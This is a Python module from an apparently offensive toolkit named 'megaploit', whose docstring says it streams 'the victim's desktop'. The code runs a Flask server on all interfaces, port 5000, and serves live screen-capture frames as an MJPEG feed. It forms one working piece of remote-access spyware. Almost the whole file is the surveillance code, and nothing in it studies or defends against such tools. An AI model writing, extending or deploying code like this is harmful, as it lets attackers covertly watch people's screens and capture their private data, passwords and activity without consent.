"""
megaploit.streaming.desktop
~~~~~~~~~~~~~~~~~~~~~~~~~~~
Flask MJPEG server — streams the victim's desktop.
Accessible at http://<agent-ip>:5000
"""

from __future__ import annotations

import os

from flask import Flask, Response, render_template

from megaploit.streaming.screen import Camera

_TEMPLATE_DIR = os.path.join(os.path.dirname(__file__), "templates")
app = Flask(__name__, template_folder=_TEMPLATE_DIR)


def _frames():
    camera = Camera()
    while True:
        frame = camera.get_frame()
        if frame is None:
            continue
        yield (
            b"--frame\r\n"
            b"Content-Type: image/jpeg\r\n\r\n" + frame + b"\r\n"
        )


@app.route("/")
def index():
    return render_template("desktop.html")


@app.route("/video_feed")
def video_feed():
    return Response(_frames(), mimetype="multipart/x-mixed-replace; boundary=frame")


def start_server(host: str = "0.0.0.0", port: int = 5000) -> None:
    app.run(host=host, port=port, debug=False, use_reloader=False)


if __name__ == "__main__":
    start_server()
